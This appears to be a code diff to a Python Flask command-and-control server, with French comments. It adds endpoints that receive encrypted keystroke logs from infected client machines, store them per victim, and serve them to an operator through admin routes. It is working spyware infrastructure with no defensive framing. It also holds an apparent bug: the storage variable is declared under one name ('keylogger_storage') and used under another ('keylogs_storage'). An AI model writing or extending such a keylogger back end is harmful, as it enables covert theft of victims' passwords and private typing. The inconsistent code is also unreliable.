@@ -15,6 +15,7 @@ clients = {}
 #In-memory storage for pending commands for clients
 pending_commands = {}
 command_results = {}
+keylogger_storage = {}
 
 encryptor = Encryptor(ENCRYPTION_KEY)
 
@@ -371,6 +372,159 @@ def submit_command_result():
         print(f"[SERVER] Traceback: {traceback.format_exc()}")
         return jsonify({"error": f"Failed to submit result: {e}"}), 500
 
+
+@app.route("/keylog_data", methods=["POST"])
+def receive_keylog_data():
+    """Endpoint pour recevoir les keylogs des clients"""
+    try:
+        print(f"[KEYLOG] Received keylog data request")
+        encrypted_data = request.json.get("data")
+        if not encrypted_data:
+            print(f"[KEYLOG] Error: No encrypted data")
+            return jsonify({"error": "No encrypted data"}), 400
+        
+        print(f"[KEYLOG] Decrypting keylog data...")
+        keylog_data = encryptor.decrypt(encrypted_data)
+        if not keylog_data:
+            print(f"[KEYLOG] Error: Failed to decrypt keylog data")
+            return jsonify({"error": "Decryption failed"}), 400
+            
+        print(f"[KEYLOG] Decrypted data type: {keylog_data.get('type')}")
+
+        # Vérifier que c'est bien des keylogs
+        if not isinstance(keylog_data, dict) or keylog_data.get("type") != "keylog_data":
+            print(f"[KEYLOG] Error: Invalid message type: {keylog_data.get('type')}")
+            return jsonify({"error": "Invalid keylog data format"}), 400
+        
+        client_id = keylog_data.get("client_id")
+        logs = keylog_data.get("logs", [])
+        log_count = keylog_data.get("log_count", 0)
+        
+        print(f"[KEYLOG] Client: {client_id}, Logs count: {log_count}")
+        
+        if client_id and logs:
+            # Initialiser le stockage pour ce client si nécessaire
+            if client_id not in keylogs_storage:
+                keylogs_storage[client_id] = []
+            
+            # Ajouter les nouveaux logs
+            keylogs_storage[client_id].extend(logs)
+            
+            # Garder seulement les 1000 derniers logs par client
+            if len(keylogs_storage[client_id]) > 1000:
+                keylogs_storage[client_id] = keylogs_storage[client_id][-1000:]
+            
+            # Mettre à jour le last_seen du client
+            if client_id in clients:
+                clients[client_id]['last_seen'] = time.time()
+                clients[client_id]['checkin_count'] = clients[client_id].get('checkin_count', 0) + 1
+            
+            print(f"[KEYLOG] ✅ Successfully stored {len(logs)} keylogs for client {client_id}")
+            print(f"[KEYLOG] Total logs for {client_id}: {len(keylogs_storage[client_id])}")
+            
+            return jsonify({
+                "success": True, 
+                "message": f"Received {len(logs)} keylogs",
+                "total_stored": len(keylogs_storage[client_id])
+            })
+        else:
+            print(f"[KEYLOG] Error: Missing client_id or logs")
+            return jsonify({"error": "Missing client_id or logs"}), 400
+    
+    except Exception as e:
+        print(f"[KEYLOG] Error in /keylog_data: {e}")
+        import traceback
+        print(f"[KEYLOG] Traceback: {traceback.format_exc()}")
+        return jsonify({"error": f"Failed to process keylogs: {e}"}), 500
+
+
+@app.route("/admin/keylogs/<client_id>", methods=["GET"])
+def get_client_keylogs(client_id):
+    """Endpoint pour récupérer les keylogs d'un client (pour le controller)"""
+    try:
+        limit = request.args.get('limit', 100, type=int)
+        
+        if client_id in keylogs_storage:
+            logs = keylogs_storage[client_id][-limit:]  # Les plus récents en premier
+            return jsonify({
+                "success": True,
+                "client_id": client_id,
+                "keylogs": logs,
+                "total_logs": len(keylogs_storage[client_id]),
+                "returned_logs": len(logs)
+            })
+        else:
+            return jsonify({
+                "success": True,
+                "client_id": client_id,
+                "keylogs": [],
+                "total_logs": 0,
+                "message": "No keylogs found for this client"
+            })
+    
+    except Exception as e:
+        print(f"[ADMIN_KEYLOG] Error getting keylogs for {client_id}: {e}")
+        return jsonify({"error": f"Failed to get keylogs: {e}"}), 500
+    
+
+@app.route("/admin/keylogs_stats", methods=["GET"])
+def get_keylogs_stats():
+    """Stats sur les keylogs stockés"""
+    try:
+        stats = {}
+        total_logs = 0
+        
+        for client_id, logs in keylogs_storage.items():
+            stats[client_id] = {
+                "log_count": len(logs),
+                "last_log_time": logs[-1]['timestamp'] if logs else "No logs",
+                "client_online": client_id in clients and (time.time() - clients[client_id].get('last_seen', 0) < 60)
+            }
+            total_logs += len(logs)
+        
+        return jsonify({
+            "success": True,
+            "total_clients_with_logs": len(keylogs_storage),
+            "total_logs_stored": total_logs,
+            "clients": stats
+        })
+    
+    except Exception as e:
+        return jsonify({"error": f"Failed to get keylog stats: {e}"}), 500
+
+
+def cleanup_old_keylogs():
+    """Nettoie les keylogs vieux de plus de 24h"""
+    while True:
+        try:
+            current_time = time.time()
+            cutoff_time = current_time - (24 * 3600)  # 24 heures
+            
+            for client_id in list(keylogs_storage.keys()):
+                # Filtrer les logs trop vieux
+                keylogs_storage[client_id] = [
+                    log for log in keylogs_storage[client_id] 
+                    if current_time - datetime.fromisoformat(log['timestamp'].replace('Z', '+00:00')).timestamp() < 24 * 3600
+                ]
+                
+                # Supprimer les entrées vides
+                if not keylogs_storage[client_id]:
+                    del keylogs_storage[client_id]
+            
+            print(f"[CLEANUP] Keylogs cleanup completed")
+            time.sleep(3600)  # Toutes les heures
+        
+        except Exception as e:
+            print(f"[CLEANUP] Error in keylogs cleanup: {e}")
+            time.sleep(300)
+
+# Start cleanup threads
+cleanup_thread = threading.Thread(target=cleanup_old_clients, daemon=True)
+cleanup_thread.start()
+
+# AJOUT: Thread de nettoyage des keylogs
+keylog_cleanup_thread = threading.Thread(target=cleanup_old_keylogs, daemon=True)
+keylog_cleanup_thread.start()
 
 @app.before_request
 def before_request():
